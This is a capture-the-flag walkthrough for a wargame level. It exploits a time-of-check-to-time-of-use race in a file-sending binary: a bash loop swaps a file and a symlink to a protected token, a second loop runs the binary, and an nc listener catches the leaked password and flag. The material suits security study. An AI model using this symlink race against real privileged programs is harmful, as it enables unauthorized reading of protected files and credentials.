# Level 10

## Resolution

As `level10`, running `ls` gives us a binary called `level10` and a file named `token`. We don't have reading rights on the token but we can test the binary.

```shell
  $> ./level10 
  ./level10 file host
    sends file to host if you have access to it
  $> ./level10 token localhost
  You dont have access to token
  $> echo "valid" > /tmp/valid
  $> ./level10 /tmp/valid <VM-IP>
  Connecting to <VM-IP>:6969 .. Unable to connect to host <VM-IP>
```

> This binary tries to connect on port `6969` of the given IP.

To understand what does the binary do we can use `ltrace`.

```shell
  $> ltrace ./level10 /tmp/valid 192.168.1.73
  __libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
  access("/tmp/valid", 4)                                      = 0
  printf("Connecting to %s:6969 .. ", "192.168.1.73")         = 35
  fflush(0xb7fd1a20Connecting to 192.168.1.73:6969 .. )                                          = 0socket(2, 1, 0)                                             = 3
  inet_addr("192.168.1.73")                                   = 0x4901a8c0
  htons(6969, 1, 0, 0, 0)                                     = 14619
  connect(3, 0xbffff70c, 16, 0, 0)                            = -1
  printf("Unable to connect to host %s\n", "192.168.1.73"Unable to connect to host 192.168.1.73     
  )    = 39
  exit(1 <unfinished ...>
  +++ exited (status 1) +++
```

After checking manuals for the listed functions, we can identify a vulnerability through [`access`](https://man7.org/linux/man-pages/man2/faccessat.2.html) called [time to check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use) induced by a race condition.

> Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using [open(2)](https://man7.org/linux/man-pages/man2/open.2.html) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.

We need to open port `6969` and listen for requests. Achieving this with [`nc`](https://linux.die.net/man/1/nc) is trivial.

```shell
  $> nc -lk 6969
```

> `-l` is used to listen for incoming connections and `-k` will make this listener lasting until termination rather that after the first received connection.

Now that `6969` is open, we can try to send data once more.

```shell
  $> ./level10 /tmp/valid <VM-IP>
  Connecting to <VM-IP>:6969 .. Connected!
  Sending file .. wrote file!
```

On the `nc` side, we get the following.
```shell
  .*( )*.
  valid
```

So we can safely assume that if we can send and read `token`, we'll see the password for `flag10` prompted the same way as this test had. For this to work we'll need two scripts... One that does the attack...

```bash
#!/bin/bash

while true;
do
  touch /tmp/link
  rm -f /tmp/link
  ln -s /home/user/level10/token /tmp/link
  rm -f /tmp/link
done
```

> It creates a file on which we have read rights then deletes it to create a symbolic link with the same name that redirects to the file we want to extract the content.

... and one that runs the command in parallel.

```bash
#!/bin/bash

IP=`ifconfig | grep -A1 "eth3" | grep "inet" | cut -d ":" -f2 | cut -d " " -f1`

while true;
do
  /home/user/level10/level10 /tmp/link $IP > /dev/null
done
```
> It retrieves the IP automatically and discards any output. It will be helpful during the attack.

All we have to do now is to run those two scripts in background and use `nc` to catch the content of `token`.

```shell
  $> /tmp/race-condition.sh &
  $> /tmp/auto-send.sh &
  $> nc -lk 6969
  ...
  .*( )*.
  woupa2yuojeeaaed06riuj63c
  .*( )*.
  ...
```

Use this string to log as `flag10` and run `getflag` to finish this level.

```shell
  $> su flag10
  Password: woupa2yuojeeaaed06riuj63c
  $> getflag
  Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

So, `feulo4b72j7edeahuete3no7c` is the flag for this level.

## Commands

- Automatic send script

  ```shell
    printf '#!/bin/bash\nIP=`ifconfig | grep -A1 "eth3" | grep "inet" | cut -d ":" -f2 | cut -d " " -f1`\nwhile true;\ndo\n\t/home/user/level10/level10 /tmp/link $IP > /dev/null\ndone\n' > /tmp/auto-send.sh && chmod 777 /tmp/auto-send.sh
  ```

- Race-condition attack script

  ```shell
    printf '#!/bin/bash\nwhile true;\ndo\n\ttouch /tmp/link\n\trm -f /tmp/link\n\tln -s /home/user/level10/token /tmp/link\n\trm -f /tmp/link\ndone\n' > /tmp/race-condition.sh && chmod 777 /tmp/race-condition.sh
  ```

## Ressources

- [time to check to time of use](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
- [netcat](https://en.wikipedia.org/wiki/Netcat)
